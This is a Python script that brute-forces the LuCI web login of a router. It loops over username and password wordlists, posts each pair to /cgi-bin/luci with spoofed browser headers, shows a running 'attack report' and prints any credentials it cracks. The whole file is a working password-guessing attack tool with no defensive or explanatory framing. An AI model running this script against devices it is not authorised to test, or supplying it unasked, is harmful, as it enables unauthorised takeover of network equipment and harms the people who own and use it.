#!/usr/bin/env python
import argparse
import requests
import httplib
import os
import sys


# Debug function
def patch_send():
    old_send = httplib.HTTPConnection.send
    def new_send(self, data):
        print data
        return old_send(self, data)
    httplib.HTTPConnection.send = new_send
#patch_send() # Debug patch

# Stderr for statuses
write=sys.stderr.write
flush=sys.stderr.flush


def login(ip, user, password):
    TARGET_URL = "http://{0}/cgi-bin/luci".format(ip)
    ORIGIN = "http://{0}/".format(ip)
    headers = {
            "Proxy-Connection": "keep-alive",
            "Origin": ORIGIN,
            "Referer": TARGET_URL,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
            }
    data = {
            "luci_username": user,
            "luci_password": password
            }
    r1 = requests.post(TARGET_URL, headers=headers, data=data)
    return r1.status_code


def show_attack_report(ML, MP, CI, CP):
    """
    Arguments:
    ML stands for MAX_LOGINS
    MP stands for MAX_PASSWORDS
    CI stands for CURRENT INDEX
    CP stands for CURRENT PAYLOAD => ( login, password )

    The report will contain:
        Total tries: ML * MP
        Current try: "%d / %d" % ( CI % MP ), MP
        Current login: %s
        Current passw: %s
    """
    os.system("clear")
    write("[*] Attack report: \n")
    write("Total tries: {0}\n".format(ML * MP))
    write("Current try: {0} / {1}\n".format((CI%MP), MP))
    write("Current login: {0}\n".format(CP[0]))
    write("Current passw: {0}\n".format(CP[1]))


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", type=str, default="192.168.1.1",
            required=True, help="Router IP")
    parser.add_argument("-l", "--login", type=str, default="admin",
            help="Default string or file to supply the user field.",
            required=True)
    parser.add_argument("-p", "--password", type=str, default="admin",
            help="Default string or file to supply the password field.",
            required=True)
    args = parser.parse_args()
    LOGIN_ATTEMPTS = []
    PASSWORD_ATTEMPTS = []
    if not os.path.exists(args.login):
        LOGIN_ATTEMPTS.append(args.login)
        MAX_LOGINS = 1
    else:
        with open(args.login, "r") as f:
            LOGIN_ATTEMPTS.extend(filter(lambda x: x != "", f.read().split("\n")))
        MAX_LOGINS = len(LOGIN_ATTEMPTS)

    if not os.path.exists(args.password):
        PASSWORD_ATTEMPTS.append(args.password)
        MAX_PASS = 1
    else:
        with open(args.password, "r") as f:
            PASSWORD_ATTEMPTS.extend(filter(lambda x: x != "", f.read().split("\n")))
        MAX_PASS = len(PASSWORD_ATTEMPTS)

    CI = 0
    for username in LOGIN_ATTEMPTS:
        for each in PASSWORD_ATTEMPTS:
            CI += 1
            show_attack_report(MAX_LOGINS, MAX_PASS, CI, (username, each))
            if login(args.ip, username, each) == 200:
                print("[+] Credentials successfully cracked!")
                print("     LOGIN: {0}".format(username))
                print("     PASSW: {0}".format(each))
                return 0

    print("[+] Attack is over, but no credential was cracked.")
    return 1


if __name__ == "__main__":
    main()
